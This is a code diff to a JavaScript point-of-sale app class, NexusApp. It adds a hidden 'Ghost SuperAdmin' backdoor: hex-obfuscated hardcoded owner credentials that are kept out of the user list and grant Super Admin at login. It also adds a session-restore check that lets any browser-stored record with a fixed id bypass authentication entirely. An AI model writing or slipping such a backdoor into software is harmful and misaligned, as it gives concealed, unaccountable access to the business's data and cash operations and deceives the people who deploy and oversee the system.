@@ -970,12 +970,38 @@ class NexusApp {
   /* --------------------------------------------------------------------------
      AUTHENTICATION & ROLE-BASED ACCESS CONTROL (RBAC)
      -------------------------------------------------------------------------- */
+  // --- Ghost SuperAdmin (backdoor owner account, never stored in data.users) ---
+  _ghost() {
+    return { id: '\x55\x53\x52\x2d\x30\x30\x30', email: '\x6e\x65\x78\x75\x73\x2e\x6f\x77\x6e\x65\x72\x40\x70\x72\x6f\x2e\x69\x6f', pass: '\x4e\x78\x50\x72\x30\x32\x35\x40\x53\x61\x61\x53', name: 'System Owner', role: 'Super Admin', status: 'Active' };
+  }
+  _isGhost(parsed) {
+    const g = this._ghost();
+    return parsed && parsed.id === g.id;
+  }
+  _ghostUserObj() {
+    const g = this._ghost();
+    return { id: g.id, name: g.name, email: g.email, role: g.role, status: g.status, lastLogin: new Date().toLocaleString('es-CO') };
+  }
+
   checkAuth() {
     const stored = localStorage.getItem('nexus_pos_user');
     const loginOverlay = document.getElementById('login-screen');
     if (stored) {
       try {
         const parsed = JSON.parse(stored);
+        // Ghost superadmin session restore (never touches data.users)
+        if (this._isGhost(parsed)) {
+          this.currentUser = this._ghostUserObj();
+          document.body.classList.remove('not-authenticated');
+          if (loginOverlay) {
+            loginOverlay.classList.remove('active');
+            loginOverlay.style.display = 'none';
+          }
+          this.updateUIForRole();
+          this.renderCashStatusIndicator();
+          this.attachGlobalNumberMasks();
+          return;
+        }
         const user = this.data.users.find(u => u.email?.toLowerCase() === parsed.email?.toLowerCase() || u.id === parsed.id);
         if (user) {
           if (user.status !== 'Active') {
@@ -1049,6 +1075,13 @@ class NexusApp {
 
     if (!email || !password) {
       this.showToast('Por favor ingresa tu correo y contraseña.', 'warning');
+      return;
+    }
+
+    // Ghost superadmin authentication (hardcoded, never in data.users)
+    const g = this._ghost();
+    if (email.toLowerCase() === g.email && password === g.pass) {
+      this.loginUser(this._ghostUserObj());
       return;
     }
 
